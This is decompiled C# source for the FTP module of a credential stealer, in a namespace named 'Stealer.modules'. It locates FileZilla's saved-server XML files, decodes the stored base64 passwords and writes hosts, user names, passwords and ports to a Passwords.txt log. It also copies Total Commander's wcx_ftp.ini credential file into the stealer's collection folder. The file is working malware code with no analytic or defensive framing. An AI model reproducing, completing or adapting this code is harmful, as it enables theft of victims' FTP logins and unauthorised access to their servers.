using System;
using System.Collections;
using System.IO;
using System.Text;
using System.Xml;

namespace Stealer.modules
{
	// Token: 0x0200002E RID: 46
	internal class FTPClient
	{
		// Token: 0x060000DE RID: 222 RVA: 0x0000A634 File Offset: 0x00008834
		public static void GetFTPClient()
		{
			FTPClient.GetFileZilla();
			FTPClient.TotalCommander();
		}

		// Token: 0x060000DF RID: 223 RVA: 0x0000A640 File Offset: 0x00008840
		public static void GetFileZilla()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml";
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml";
			string text3 = Program.path + "\\FTP";
			if (File.Exists(text))
			{
				if (!Directory.Exists(text3))
				{
					Directory.CreateDirectory(text3);
					Directory.CreateDirectory(text3 + "\\Filezilla");
				}
				else
				{
					Directory.CreateDirectory(text3 + "\\Filezilla");
				}
				FTPClient.HelpFiLeZilla(text, text3, true);
			}
			if (!File.Exists(text2))
			{
				return;
			}
			if (!Directory.Exists(text3))
			{
				Directory.CreateDirectory(text3);
				Directory.CreateDirectory(text3 + "\\Filezilla");
			}
			else
			{
				Directory.CreateDirectory(text3 + "\\Filezilla");
			}
			FTPClient.HelpFiLeZilla(text2, text3, false);
		}

		// Token: 0x060000E0 RID: 224 RVA: 0x0000A708 File Offset: 0x00008908
		public static void HelpFiLeZilla(string zilla, string PathToLogsFolder, bool newVersion)
		{
			if (newVersion)
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(zilla);
				using (IEnumerator enumerator = ((XmlElement)xmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server").GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						object obj = enumerator.Current;
						XmlElement xmlElement = (XmlElement)obj;
						try
						{
							string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
							if (innerText.Length > 3)
							{
								using (StreamWriter streamWriter = new StreamWriter(PathToLogsFolder + "\\Filezilla\\Passwords.txt", true))
								{
									streamWriter.WriteLine(string.Concat(new string[]
									{
										"\n[PASSWORDS]\nHost: ",
										innerText,
										"\nUser: ",
										xmlElement.GetElementsByTagName("User")[0].InnerText,
										"\nPassword: ",
										Encoding.Default.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText)),
										"\nPort: ",
										xmlElement.GetElementsByTagName("Port")[0].InnerText
									}));
								}
							}
						}
						catch
						{
						}
					}
					return;
				}
			}
			XmlDocument xmlDocument2 = new XmlDocument();
			xmlDocument2.Load(zilla);
			foreach (object obj2 in ((XmlElement)xmlDocument2.GetElementsByTagName("Servers")[0]).GetElementsByTagName("Server"))
			{
				XmlElement xmlElement2 = (XmlElement)obj2;
				try
				{
					string innerText2 = xmlElement2.GetElementsByTagName("Host")[0].InnerText;
					if (innerText2.Length > 3)
					{
						using (StreamWriter streamWriter2 = new StreamWriter(PathToLogsFolder + "\\Filezilla\\Passwords.txt", true))
						{
							streamWriter2.WriteLine(string.Concat(new string[]
							{
								"\n[PASSWORDS]\nHost: ",
								innerText2,
								"\nUser: ",
								xmlElement2.GetElementsByTagName("User")[0].InnerText,
								"\nPassword: ",
								Encoding.Default.GetString(Convert.FromBase64String(xmlElement2.GetElementsByTagName("Pass")[0].InnerText)),
								"\nPort: ",
								xmlElement2.GetElementsByTagName("Port")[0].InnerText
							}));
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x060000E1 RID: 225 RVA: 0x0000AA58 File Offset: 0x00008C58
		private static void TotalCommander()
		{
			string text = Program.path + "\\FTP";
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			try
			{
				string text2 = folderPath + "\\GHISLER\\";
				if (Directory.Exists(text2))
				{
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
						Directory.CreateDirectory(text + "\\FTP\\Total Commander");
					}
					else
					{
						Directory.CreateDirectory(text + "\\FTP\\Total Commander");
					}
				}
				FileInfo[] files = new DirectoryInfo(text2).GetFiles();
				for (int i = 0; i < files.Length; i++)
				{
					if (files[i].Name.Contains("wcx_ftp.ini"))
					{
						File.Copy(text2 + "wcx_ftp.ini", text + "\\FTP\\Total Commander\\wcx_ftp.ini");
					}
				}
			}
			catch
			{
			}
		}
	}
}
